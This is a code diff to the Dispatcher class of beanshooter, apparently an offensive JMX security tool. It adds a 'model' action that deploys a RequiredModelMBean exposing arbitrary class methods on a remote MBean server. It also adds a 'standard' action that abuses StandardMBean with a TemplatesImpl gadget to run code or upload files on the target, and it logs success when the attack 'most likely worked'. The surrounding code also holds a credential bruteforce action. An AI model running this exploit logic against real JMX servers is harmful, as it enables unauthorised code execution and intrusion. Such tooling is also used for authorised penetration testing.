@@ -9,11 +9,20 @@ import java.util.Set;
 
 import javax.management.Attribute;
 import javax.management.MBeanException;
+import javax.management.MBeanParameterInfo;
 import javax.management.MBeanServerConnection;
 import javax.management.ObjectInstance;
 import javax.management.ObjectName;
 import javax.management.ReflectionException;
+import javax.management.RuntimeErrorException;
 import javax.management.RuntimeMBeanException;
+import javax.management.StandardMBean;
+import javax.management.modelmbean.ModelMBeanAttributeInfo;
+import javax.management.modelmbean.ModelMBeanInfo;
+import javax.management.modelmbean.ModelMBeanInfoSupport;
+import javax.management.modelmbean.ModelMBeanOperationInfo;
+import javax.management.modelmbean.RequiredModelMBean;
+import javax.xml.transform.Templates;
 
 import org.jolokia.client.exception.J4pRemoteException;
 
@@ -100,6 +109,90 @@ public class Dispatcher {
 
         MBeanServerClient mBeanServerClient = getMBeanServerClient();
         mBeanServerClient.deployMBean(mBeanClassName, mBeanObjectName, BeanshooterOption.DEPLOY_JAR_FILE.getValue());
+
+        Logger.decreaseIndent();
+    }
+
+    /**
+     * Creates a new RequiredModelMBean on the remote MBean server that allows access to a user specified
+     * class.
+     */
+    public void model()
+    {
+        String className = ArgumentHandler.require(BeanshooterOption.MODEL_CLASS_NAME);
+        ObjectName mBeanObjectName = Utils.getObjectName(ArgumentHandler.require(BeanshooterOption.MODEL_OBJ_NAME));
+
+        ModelMBeanOperationInfo[] ops;
+        MBeanServerClient mBeanServerClient = getMBeanServerClient();
+
+        try
+        {
+            Class<?> cls = Class.forName(className);
+            ops = Utils.createModelMBeanInfosFromClass(cls);
+            Logger.printlnBlue("Deploying RequiredModelMBean supporting methods from " + cls.getName());
+        }
+
+        catch (ClassNotFoundException e)
+        {
+            if (BeanshooterOption.MODEL_SIGNATURE.isNull() && BeanshooterOption.MODEL_SIGNATURE_FILE.isNull())
+            {
+                Logger.eprintlnMixedYellow("The specified class", className, "cannot be found locally.");
+                Logger.eprintMixedBlue("You can still use it by providing method signatures via", "--signature", "or ");
+                Logger.eprintlnPlainBlue("--signature-file");
+                Utils.exit(e);
+            }
+
+            ops = Utils.createModelMBeanInfosFromArg(className);
+            Logger.printlnBlue("Deploying RequiredModelMBean supporting user specified methods");
+        }
+
+        Logger.lineBreak();
+        Logger.increaseIndent();
+
+        ModelMBeanInfo mmbi = new ModelMBeanInfoSupport(className, "ModelMBean", new ModelMBeanAttributeInfo[] {}, null, ops, null);
+        mBeanServerClient.deployMBean(RequiredModelMBean.class.getName(), mBeanObjectName, null, new Object[] { mmbi }, new String[] { ModelMBeanInfo.class.getName() });
+
+        Logger.lineBreak();
+        Logger.printlnYellow("Available Methods:");
+
+        for (ModelMBeanOperationInfo op : ops)
+        {
+            String ret = op.getReturnType();
+            String name = op.getName();
+            StringBuilder args = new StringBuilder();
+
+            for (MBeanParameterInfo param : op.getSignature())
+            {
+                args.append(param.getType());
+                args.append(", ");
+            }
+
+            if (op.getSignature().length > 0)
+                args.setLength(args.length() - 2);
+
+            Logger.printMixedBlue("  -", ret + " ");
+            Logger.printPlainYellow(name);
+            Logger.printlnPlainBlue("(" + args.toString() + ")");
+        }
+
+        if (BeanshooterOption.MODEL_RESOURCE.notNull())
+        {
+            Object managedResource = PluginSystem.strToObj(BeanshooterOption.MODEL_RESOURCE.getValue());
+
+            try
+            {
+                Logger.lineBreak();
+                Logger.printlnMixedYellow("Setting managed resource to:", BeanshooterOption.MODEL_RESOURCE.getValue());
+                mBeanServerClient.invoke(mBeanObjectName, "setManagedResource", new String[] { Object.class.getName(), "java.lang.String" }, managedResource, "objectReference");
+                Logger.printlnMixedBlue("Managed resource was set", "successfully.");
+            }
+
+            catch (MBeanException | ReflectionException | IOException e)
+            {
+                ExceptionHandler.showStackTrace(e);
+                ExceptionHandler.internalError("model", "Caught " + e.getClass().getName() + " while invoking setManagedResource.");
+            }
+        }
 
         Logger.decreaseIndent();
     }
@@ -294,6 +387,100 @@ public class Dispatcher {
     /**
      * Attempt to bruteforce valid credentials on the targeted JMX endpoint.
      */
+    public void standard()
+    {
+        String className = StandardMBean.class.getName();
+        ObjectName mBeanObjectName = Utils.getObjectName("de.qtc.beanshooter:standard=" + System.nanoTime());
+
+        String operation = "template-" + BeanshooterOption.STANDARD_OPERATION.<String>getValue();
+        String arguments = BeanshooterOption.STANDARD_OPERATION_ARGS.getValue();
+
+        if (!operation.equals("template-tonka") && arguments.equals(""))
+        {
+            Logger.eprintlnMixedYellow("The " + operation + " action requires",  "an additional parameter", "to work with.");
+            Utils.exit();
+        }
+
+        Logger.printlnBlue("Creating a TemplateImpl payload object to abuse StandardMBean");
+        Logger.lineBreak();
+        Logger.increaseIndent();
+
+        Object templateGadget = PluginSystem.getPayloadObject(BeanshooterOperation.STANDARD, operation, arguments);
+        MBeanServerClient mBeanServerClient = getMBeanServerClient();
+
+        String[] ctorArgTypes = new String[] { Object.class.getName(), Class.class.getName() };
+        Object[] ctorArgs = new Object[] { templateGadget, Templates.class };
+
+        mBeanServerClient.deployMBean(className, mBeanObjectName, null, ctorArgs, ctorArgTypes);
+        Logger.lineBreak();
+
+        try
+        {
+            mBeanServerClient.invoke(mBeanObjectName, "newTransformer", new String[0]);
+        }
+
+        catch (RuntimeMBeanException e)
+        {
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if (t instanceof NullPointerException)
+            {
+                Logger.printlnMixedBlue("Caught", "NullPointerException", "while invoking the newTransformer action.");
+                Logger.printlnMixedBlue("This is expected bahavior and the attack most likely", "worked", ":)");
+            }
+
+            else
+            {
+                ExceptionHandler.unexpectedException(e, "standard", "action", true);
+            }
+        }
+
+        catch (RuntimeErrorException e)
+        {
+            if (operation.equals("template-upload"))
+            {
+                String[] split = arguments.split("::");
+
+                if (split.length < 2)
+                    ExceptionHandler.handleFileWrite(e, arguments, false);
+
+                else
+                    ExceptionHandler.handleFileWrite(e, split[1], false);
+            }
+
+            else
+            {
+                ExceptionHandler.unexpectedException(e, "standard", "action", false);
+            }
+        }
+
+        catch (MBeanException | ReflectionException | IOException e)
+        {
+            Throwable t = ExceptionHandler.getCause(e);
+
+            if (t instanceof IllegalAccessError && t.getMessage().contains("module java.xml does not export"))
+            {
+                Logger.eprintlnMixedYellow("Caught", "IllegalAccessError", "during template transformation.");
+                Logger.eprintlnMixedBlue("The server does not export", "AbstractTranslet", "which prevents the standard action from working.");
+                ExceptionHandler.showStackTrace(e);
+            }
+
+            else
+            {
+                ExceptionHandler.unexpectedException(e, "standard", "action", false);
+            }
+        }
+
+        finally
+        {
+            Logger.lineBreak();
+            mBeanServerClient.unregisterMBean(mBeanObjectName);
+        }
+    };
+
+    /**
+     * Attempt to bruteforce valid credentials on the targeted JMX endpoint.
+     */
     public void brute()
     {
         String host = ArgumentHandler.require(BeanshooterOption.TARGET_HOST);
@@ -375,12 +562,12 @@ public class Dispatcher {
                 Logger.printlnBlue("Call was successful.");
         }
 
-        catch (MBeanException | ReflectionException | IOException e)
+        catch (RuntimeMBeanException | MBeanException | ReflectionException | IOException e)
         {
             Throwable t = ExceptionHandler.getCause(e);
             String message = t.getMessage();
 
-            if (message.contains("No operation " + methodName))
+            if (message != null && message.contains("No operation " + methodName))
             {
                 if (message.contains("Known signatures: "))
                     ExceptionHandler.noOperationAlternative(e, signature, methodName, message);
@@ -468,14 +655,12 @@ public class Dispatcher {
             {
                 Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while setting attribute %s from %s", attrName, objectName));
                 Logger.eprintlnMixedBlue("There seems to be", "no setter available", "for the requested attribute.");
-                ExceptionHandler.showStackTrace(e);
-                Utils.exit();
+                Utils.exit(e);
             }
 
             Logger.eprintlnMixedYellow("Caught", e.getClass().getName(), String.format("while accessing attribute %s from %s", attrName, objectName));
             Logger.eprintln("beanshooter does not handle exceptions for custom attribute access.");
-            ExceptionHandler.stackTrace(e);
-            Utils.exit();
+            Utils.exit(e);
         }
     }
 
